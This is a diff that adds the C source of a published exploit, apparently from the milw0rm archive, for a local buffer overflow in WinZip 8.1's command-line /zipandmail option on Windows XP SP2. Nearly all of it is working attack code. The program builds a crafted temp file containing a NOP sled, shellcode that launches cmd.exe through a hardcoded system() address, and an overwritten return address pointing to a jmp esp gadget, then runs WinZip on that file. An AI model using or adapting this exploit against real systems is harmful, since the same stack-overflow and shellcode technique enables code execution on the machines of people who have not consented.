@@ -1,0 +1,82 @@
+/*
+*
+* WinZip Command Line Local Buffer Overflow
+* http://securitytracker.com/alerts/2004/Sep/1011132.html
+* http://www.winzip.com/wz90sr1.htm
+* Exploit coded By ATmaCA
+* Web: atmacasoft.com && spyinstructors.com
+* E-Mail: atmaca@icqmail.com
+* Credit to kozan
+*
+*/
+
+/*
+*
+* Tested with WinZip 8.1 on Win XP Sp2 En
+* Bug Fixed on WinZip 9.0 Service Release 1 (SR-1)
+* http://www.winzip.com/wz90sr1.htm
+*
+*/
+
+#include <windows.h>
+#include <stdio.h>
+
+#define NOP 0x90
+
+void main()
+{
+        // create crafted command line
+        char tmpfile[] = "c:\\wzs45.tmp";
+        char winzippath[] = "C:\\Program Files\\WINZIP\\winzip32.exe";
+        char zipandmailpar[] = " -* /zipandmail /@  ";
+        char runpar[300];
+        int i = 0;
+        strcpy(runpar,winzippath);
+        strcat(runpar,zipandmailpar);
+        strcat(runpar,tmpfile);
+
+        // need for some input file name .tmp but not must to exist
+        char inputfile[] = "C:\\someinputfile.ext\n";
+
+        // launch a local cmd.exe
+        char shellcode[] =
+        "\x55\x8B\xEC\x33\xFF"
+        "\x57\x83\xEC\x04\xC6\x45\xF8"
+        "\x63\xC6\x45\xF9\x6D\xC6\x45"
+        "\xFA\x64\xC6\x45\xFB\x2E\xC6"
+        "\x45\xFC\x65\xC6\x45\xFD\x78"
+        "\xC6\x45\xFE\x65\xB8"
+        "\xC7\x93\xC2\x77" //77C293C7 system() - WinXP SP2 - msvcrt.dll
+        "\x50\x8D\x45\xF8\x50"
+        "\xFF\x55\xF4";
+
+        // create crafted .tmp file
+        FILE *di;
+        if( (di=fopen(tmpfile,"wb")) == NULL ){
+                return;
+        }
+
+        for(i=0;i<sizeof(inputfile)-1;i++)
+                fputc(inputfile[i],di);
+
+        fprintf(di,"c:\\");
+
+        for(i=0;i<384;i++)
+                fputc(NOP,di);
+
+
+        for(i=0;i<sizeof(shellcode)-1;i++)
+                fputc(shellcode[i],di);
+
+        fprintf(di,"\xBF\xAC\xDA\x77");  //EIP - WinXp Sp2 Eng - jmp esp addr
+        fprintf(di,"\x90\x90\x90\x90");  //NOPs
+        fprintf(di,"\x90\x83\xEC\x74");  //sub esp,0x74
+        fprintf(di,"\xFF\xE4\x90\x90");  //jmp esp
+
+        fprintf(di,"\n");
+
+        fclose(di);
+        WinExec(runpar,SW_SHOW);
+}
+
+// milw0rm.com [2005-06-07]
